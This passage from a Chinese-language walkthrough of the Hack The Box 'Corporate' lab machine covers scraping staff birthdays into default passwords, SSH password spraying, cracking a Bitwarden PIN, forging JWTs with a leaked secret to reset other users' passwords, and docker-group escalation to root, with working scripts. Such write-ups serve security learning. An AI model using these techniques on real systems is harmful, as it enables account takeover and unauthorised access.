class="string">&quot;eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=&quot;</span>, <span class="string">&quot;session.sig&quot;</span>: <span class="string">&quot;qf5ADYsgWjTRf8WUjJAj9HEYS20&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;W/\&quot;e93-FDIeVpj05tAMRIoL007GQHMSxSA\&quot;&quot;</span>&#125;</span><br><span class="line">    req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">    <span class="keyword">if</span> (req.status_code == <span class="number">200</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found: &quot;</span>+<span class="built_in">str</span>(x))</span><br><span class="line">        data = (req.text)</span><br><span class="line"></span><br><span class="line">        f = <span class="string">&#x27;&lt;table class=&quot;table&quot;&gt;&#x27;</span></span><br><span class="line">        table_begin = data.find(f) + <span class="built_in">len</span>(f)</span><br><span class="line">        table_end = data.find(<span class="string">&quot;&lt;/table&gt;&quot;</span>,table_begin)</span><br><span class="line">        table = data[table_begin:table_end]</span><br><span class="line"></span><br><span class="line">        f = <span class="string">&#x27;About Me&#x27;</span></span><br><span class="line">        about_begin = table.find(<span class="string">&#x27;&lt;td&gt;&#x27;</span>,table.find(f)) + <span class="built_in">len</span>(<span class="string">&#x27;&lt;td&gt;&#x27;</span>)</span><br><span class="line">        about_end = table.find(<span class="string">&#x27;&lt;/td&gt;&#x27;</span>,about_begin)</span><br><span class="line">        about = table[about_begin:about_end]</span><br><span class="line">        about = about.strip()</span><br><span class="line">        <span class="built_in">print</span>(about)</span><br><span class="line"></span><br><span class="line">        f = <span class="string">&#x27;Roles&#x27;</span></span><br><span class="line">        about_begin = table.find(<span class="string">&#x27;&lt;td&gt;&#x27;</span>,table.find(f)) + <span class="built_in">len</span>(<span class="string">&#x27;&lt;td&gt;&#x27;</span>)</span><br><span class="line">        about_end = table.find(<span class="string">&#x27;&lt;/td&gt;&#x27;</span>,about_begin)</span><br><span class="line">        roles = table[about_begin:about_end]</span><br><span class="line">        roles = roles.strip()</span><br><span class="line">        <span class="built_in">print</span>(roles)</span><br><span class="line"></span><br><span class="line">        f = <span class="string">&#x27;Email&#x27;</span></span><br><span class="line">        about_begin = table.find(<span class="string">&#x27;mailto:&#x27;</span>,table.find(f)) + <span class="built_in">len</span>(<span class="string">&#x27;mailto:&#x27;</span>)</span><br><span class="line">        about_end = table.find(<span class="string">&#x27;&quot;&gt;&#x27;</span>,about_begin)</span><br><span class="line">        email = table[about_begin:about_end]</span><br><span class="line">        email = email.strip()</span><br><span class="line">        <span class="built_in">print</span>(email)</span><br><span class="line"></span><br><span class="line">        f = <span class="string">&#x27;Birthday&#x27;</span></span><br><span class="line">        about_begin = table.find(<span class="string">&#x27;&lt;td&gt;&#x27;</span>,table.find(f)) + <span class="built_in">len</span>(<span class="string">&#x27;&lt;td&gt;&#x27;</span>)</span><br><span class="line">        about_end = table.find(<span class="string">&#x27;&lt;/td&gt;&#x27;</span>,about_begin)</span><br><span class="line">        birth = table[about_begin:about_end]</span><br><span class="line">        birth = birth.strip()</span><br><span class="line">        <span class="built_in">print</span>(birth)</span><br><span class="line"></span><br><span class="line">        dt = datetime.datetime.strptime(birth, <span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        passwd = <span class="string">&quot;CorporateStarter&quot;</span> + dt.strftime(<span class="string">&#x27;%d%m%Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(passwd)</span><br><span class="line">        save.writelines(<span class="string">&quot;%s|%s\n&quot;</span> % (email,passwd))</span><br><span class="line"></span><br><span class="line">save.close()</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174554-qa3rsq8.png" alt="image">​</p>
+<p>然後用cut 切分成 <code>user.txt</code>​ 和 <code>pass.txt</code>​</p>
+<h2 id="0x6-Shell-on-the-box"><a href="#0x6-Shell-on-the-box" class="headerlink" title="0x6 Shell on the box"></a>0x6 Shell on the box</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174744-bcsx6q1.png" alt="image">​</p>
+<p>有個很神奇的VPN文件，下載下來，連進去看看，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ip a </span><br><span class="line">6: tun1: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500</span><br><span class="line">    <span class="built_in">link</span>/none</span><br><span class="line">    inet 10.8.0.2/24 scope global tun1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::d4c0:72df:eb08:2b6b/64 scope <span class="built_in">link</span> stable-privacy proto kernel_ll</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">$ ip r </span><br><span class="line">10.9.0.0/24 via 10.8.0.1 dev tun1</span><br></pre></td></tr></table></figure>
+
+<p>得到一個 <code>10.9.0.0</code>​ 的子網，所以nmap掃一下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.9.0.1</span><br><span class="line">PORT     STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)</span><br><span class="line"></span><br><span class="line">80/tcp   open  http     syn-ack ttl 64 OpenResty web app server 1.21.4.3</span><br><span class="line">|_http-title: Did not follow redirect to http://corporate.htb</span><br><span class="line">|_http-server-header: openresty/1.21.4.3</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line"></span><br><span class="line">389/tcp  open  ldap     syn-ack ttl 64 OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">636/tcp  open  ssl/ldap syn-ack ttl 64 OpenLDAP 2.2.X - 2.3.X</span><br><span class="line"></span><br><span class="line">2049/tcp open  nfs      syn-ack ttl 64 4 (RPC <span class="comment">#100003)</span></span><br><span class="line">3128/tcp open  http     syn-ack ttl 64 Proxmox Virtual Environment REST API 3.0</span><br><span class="line">|_http-server-header: pve-api-daemon/3.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title.</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.9.0.4</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.18s latency).</span><br><span class="line">Scanned at 2023-12-23 17:50:22 CST <span class="keyword">for</span> 30s</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 2f:b1:d4:7c:ac:3a:2c:b1:ee:ee:6f:7f:<span class="built_in">df</span>:41:29:c3 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJkbxANx1rZ6NNOJ9G1R4JD6Og90NJTtookOgtQm0gHJnEaqbj45AQl2+Bi2SXeaZ6LGEC5qyDBAqKYxNtTjVj8=</span><br><span class="line">|   256 f0:25:8e:11:26:bd:f3:78:65:59:32:c3:55:7e:99:e5 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICWClTzw/n5oewn15Bnl1DrML3uQLA0XgCzgjy4ySD5v</span><br><span class="line">111/tcp open  rpcbind syn-ack ttl 63 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|_  100000  3,4          111/udp6  rpcbind</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>從結果上可以猜到 <code>10.9.0.1</code>​ 是PVE的，<code>10.9.0.4</code>​ 應該是宿主主機，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223175322-07b1ktc.png" alt="image">​</p>
+<p>果不其然，然後發現兩個機器有ssh，使用上面發現的字典，暴力破解times！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec ssh 10.9.0.1 -u user.txt -p  pass.txt  --continue-on-success --no-bruteforce</span><br><span class="line">$ crackmapexec ssh 10.9.0.4 -u user.txt -p  pass.txt  --continue-on-success --no-bruteforce</span><br></pre></td></tr></table></figure>
+
+<p>​<code>10.9.0.1</code>​​ 什麽也沒有，<code>10.9.0.4</code>​​倒是有幾個賬號，所以登陸進去看看。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223175624-l1xbq5m.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SSH         10.9.0.4        22     10.9.0.4         [+] elwin.jones:CorporateStarter04041987</span><br><span class="line">SSH         10.9.0.4        22     10.9.0.4         [+] laurie.casper:CorporateStarter18111959</span><br><span class="line">SSH         10.9.0.4        22     10.9.0.4         [+] nya.little:CorporateStarter21061965</span><br><span class="line">SSH         10.9.0.4        22     10.9.0.4         [+] brody.wiza:CorporateStarter14071992</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223180022-rd2nsk6.png" alt="image">​</p>
+<p>拿到 user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@corporate-workstation-04:~$ sudo -s</span><br><span class="line">[sudo] password <span class="keyword">for</span> elwin.jones:</span><br><span class="line">elwin.jones is not <span class="keyword">in</span> the sudoers file.  This incident will be reported.</span><br><span class="line"></span><br><span class="line">elwin.jones@corporate-workstation-04:~$ <span class="built_in">id</span></span><br><span class="line">uid=5021(elwin.jones) gid=5021(elwin.jones) <span class="built_in">groups</span>=5021(elwin.jones),503(it)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x7-看到瀏覽器插件有-Bitwarden"><a href="#0x7-看到瀏覽器插件有-Bitwarden" class="headerlink" title="0x7 看到瀏覽器插件有 Bitwarden"></a>0x7 看到瀏覽器插件有 Bitwarden</h2><p>通過搜索發現一個神奇的地方：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201150-d8jw6he.png" alt="image">​</p>
+<p>看到其他三個賬號都沒有這個文件夾，只有這個賬號有，所以打包下來，放到本地。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101181210-gs5e9o4.png" alt="image">​</p>
+<p>然後進去自己的火狐文件夾，把上面的文件全部複製到本地，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -rf /home/mane/Corporate/browser/home/guests/elwin.jones/.mozilla/firefox/tr2cgmb6.default-release/* .</span><br></pre></td></tr></table></figure>
+
+<p>瀏覽器打開後下載bitwarn，就看到需要輸入pin</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101181344-x82mw0o.png" alt="image">​</p>
+<p>‍</p>
+<p>網上找一下pin的爆破，可以看到它成功的爆破四位數字，找到了這篇：<a target="_blank" rel="noopener" href="https://ambiso.github.io/bitwarden-pin/">https://ambiso.github.io/bitwarden-pin/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ambiso/bitwarden-pin bitwarden-pin </span><br><span class="line"><span class="built_in">cd</span> bitwarden-pin </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101182106-8ch50x3.png" alt="image">​</p>
+<p>通過源碼可以看見，他需要 <code>data.json</code>​。</p>
+<p>所以可以對插件進行 Inspector，得到 <code>data.json</code>​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201513-vs2305c.png" alt="image">​</p>
+<p>把 <code>view-source:</code>​ 去掉，在控制臺輸入如下代碼：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.<span class="property">storage</span>.<span class="property">local</span>.<span class="title function_">get</span>(<span class="literal">null</span>, <span class="keyword">function</span>(<span class="params">data</span>) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(data);&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201614-1yv55v9.png" alt="image">​</p>
+<p>右鍵複製object，然後保存到 data.json 即可。</p>
+<p>從文件可以看到，他是迭代 600000，所以要該脚本</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201844-xs2vx5p.png" alt="image">​</p>
+<p>把 100000改成 600000</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101200526-6fum62l.png" alt="image">​</p>
+<p>然後改一下前面載入的文件</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202008-yead0ni.png" alt="image">​</p>
+<p>跑一下，得到 0239，然後輸入到插件，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202027-4drbuj6.png" alt="image">​</p>
+<p>得到密碼和TOTP。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202106-lhzd32n.png" alt="image">​</p>
+<p>‍</p>
+<h2 id="0x8-git-corporate-htb-修改任意用戶的密碼（除了sysadmin）"><a href="#0x8-git-corporate-htb-修改任意用戶的密碼（除了sysadmin）" class="headerlink" title="0x8 - git.corporate.htb  修改任意用戶的密碼（除了sysadmin）"></a>0x8 - git.corporate.htb  修改任意用戶的密碼（除了sysadmin）</h2><p>把 host 對準 <code>10.9.0.1 git.corporate.htb</code>​，進入内網。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202526-n8u1kti.png" alt="image">​</p>
+<p>‍</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101220737-oxlqgkb.png" alt="image">​</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">JWT_SECRET</span>=09cb527651c4bd385483815627e6241bdf40042a</span><br></pre></td></tr></table></figure>
+
+<p>因爲有了<code>JWT_SECRET</code>​可以僞造任意的cookie啦，​​</p>
+<p>‍</p>
+<p>gitea有三個項目，所以思考下裏面的源碼寫了什麽，有沒有漏洞。</p>
+<p><strong>感興趣的地方 #1</strong></p>
+<p><a target="_blank" rel="noopener" href="http://git.corporate.htb/CorporateIT/corporate-sso/src/branch/master/src/utils.ts">http://git.corporate.htb/CorporateIT/corporate-sso/src/branch/master/src/utils.ts</a></p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184242-n7je69o.png" alt="image">​</p>
+<p>不允許修改關於sysadmin組的密碼。</p>
+<p>‍</p>
+<p><strong>感興趣的地方 #2</strong></p>
+<p><a target="_blank" rel="noopener" href="http://git.corporate.htb/CorporateIT/corporate-sso/src/branch/master/src/app.ts">http://git.corporate.htb/CorporateIT/corporate-sso/src/branch/master/src/app.ts</a></p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184403-bbozhp7.png" alt="image">​</p>
+<p>如果 jwt 的  <code>requireCurrentPassword</code>​ 是 <code>false</code>​ 的情況下，就可以不需要當前賬號的密碼。</p>
+<p>‍</p>
+<p>似乎可以在 <a target="_blank" rel="noopener" href="http://sso.corporate.htb/reset-password">http://sso.corporate.htb/reset-password</a> 修改任何賬戶的密碼，除了 <code>sysadmin</code>​ 組。</p>
+<p>‍</p>
+<p>問題是需要改哪個高價值的用戶？</p>
+<p>‍</p>
+<p>枚舉了半天，發現docker的權限怪怪的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elwin.jones@corporate-workstation-04:~$ docker ps -a</span><br><span class="line">permission denied <span class="keyword">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get <span class="string">&quot;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1&quot;</span>: dial unix /var/run/docker.sock: connect: permission denied</span><br><span class="line"></span><br><span class="line">elwin.jones@corporate-workstation-04:~$ <span class="built_in">ls</span> -lah /var/run/docker.sock</span><br><span class="line">srw-rw---- 1 root engineer 0 Jan  4 10:27 /var/run/docker.sock</span><br></pre></td></tr></table></figure>
+
+<p>​<code>engineer</code>​ 似乎有權限使用docker，因爲只要有權限使用docker就可以快速拿到root。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184714-8rc6xu7.png" alt="image">​</p>
+<p>然後隨便挑選一個用戶僞造cookie去修改用戶密碼。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104185145-ki8e0rn.png" alt="image">​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">5070</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;ward&quot;</span><span class="punctuation">,</span><span class="attr">&quot;surname&quot;</span><span class="punctuation">:</span><span class="string">&quot;pfannerstill&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;Hermina.Leuschke@corporate.htb&quot;</span><span class="punctuation">,</span><span class="attr">&quot;roles&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;sales&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;requireCurrentPassword&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1703083629</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1735716461</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用這個cookie去登錄</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104185429-s0o1ctz.png" alt="image">​</p>
+<p>快樂的修改密碼，完事后，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184936-l2ehzea.png" alt="image">​</p>
+<p>果然可以使用docker權限。</p>
+<p>爲了方便我寫了個脚本去修改密碼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import jwt,json</span><br><span class="line">import base64,sys</span><br><span class="line"></span><br><span class="line"># Example</span><br><span class="line"># python3 change.py &lt;name&gt; &lt;surname&gt;</span><br><span class="line"></span><br><span class="line">print(&quot;[POWER BY MANE]&quot;)</span><br><span class="line"></span><br><span class="line">changepassword = &quot;powerbymane&quot;</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 3:</span><br><span class="line">        print(&quot;[!] Usage: python3 change.py &lt;name&gt; &lt;surname&gt;&quot;)</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line"># 0x1 Craft JWT Token</span><br><span class="line">name = sys.argv[1]</span><br><span class="line">surname = sys.argv[2]</span><br><span class="line"></span><br><span class="line">print(&quot;[*] name = &quot; + name)</span><br><span class="line">print(&quot;[*] surName = &quot; + surname)</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;&quot;&#123;</span><br><span class="line">  &quot;id&quot;: 5070,</span><br><span class="line">  &quot;name&quot;: &quot;%s&quot;,</span><br><span class="line">  &quot;surname&quot;: &quot;%s&quot;,</span><br><span class="line">  &quot;email&quot;: &quot;Hermina.Leuschke@corporate.htb&quot;,</span><br><span class="line">  &quot;roles&quot;: [</span><br><span class="line">    &quot;sales&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;requireCurrentPassword&quot;: false,</span><br><span class="line">  &quot;iat&quot;: 1703083629,</span><br><span class="line">  &quot;exp&quot;: 1735716461</span><br><span class="line">&#125; &quot;&quot;&quot; % (name,surname)</span><br><span class="line"></span><br><span class="line">cookie = jwt.encode(json.loads(payload), &#x27;09cb527651c4bd385483815627e6241bdf40042a&#x27;, algorithm=&#x27;HS256&#x27;)</span><br><span class="line">print(&quot;[*] Cookie = &quot; + cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 0x2 Send Request</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">burp0_url = &quot;http://sso.corporate.htb:80/reset-password&quot;</span><br><span class="line">burp0_cookies = &#123;&quot;CorporateSSO&quot;: cookie&#125;</span><br><span class="line">burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://sso.corporate.htb&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://sso.corporate.htb/reset-password&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;</span><br><span class="line">burp0_data = &#123;&quot;newPassword&quot;: changepassword, &quot;confirmPassword&quot;: changepassword&#125;</span><br><span class="line">return_html  = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text</span><br><span class="line"></span><br><span class="line"># 0x3 get result</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">from lxml import html</span><br><span class="line">xml = html.fromstring(return_html)</span><br><span class="line">x = xml.xpath(&quot;//div[contains(@class, &#x27;alert&#x27;)]&quot;)[0]</span><br><span class="line">print(&quot;[!] Server Return: &quot; + x.text_content())</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104185524-bnn5csc.png" alt="image">​</p>
+<h2 id="0x9-docker-to-root"><a href="#0x9-docker-to-root" class="headerlink" title="0x9 docker to root"></a>0x9 docker to root</h2><p>因爲裏面的docker什麽也沒有，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104193508-in30tm4.png" alt="image">​</p>
+<p>然後就想辦法import 一個image，參考了docker的save and load大法：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/save/">https://docs.docker.com/engine/reference/commandline/save/</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/load/">https://docs.docker.com/engine/reference/commandline/load/</a></p>
+<p>所以在本地製作一個image先</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull alpine:latest</span><br><span class="line">docker save alpine:latest | gzip &gt; mane.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然後上傳到對面的機器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; mane.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然後就是基本操作。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104194100-y6d5wo8.png" alt="image">​</p>
+<h2 id="0xdeed-值得思考的-LDAP-已打补丁"><a href="#0xdeed-值得思考的-LDAP-已打补丁" class="headerlink" title="0xdeed 值得思考的 LDAP (已打补丁)"></a><del>0xdeed 值得思考的 LDAP (已打补丁)</del></h2><p>因爲我有了賬號，其實我可以去ldap看看有什麽。</p>
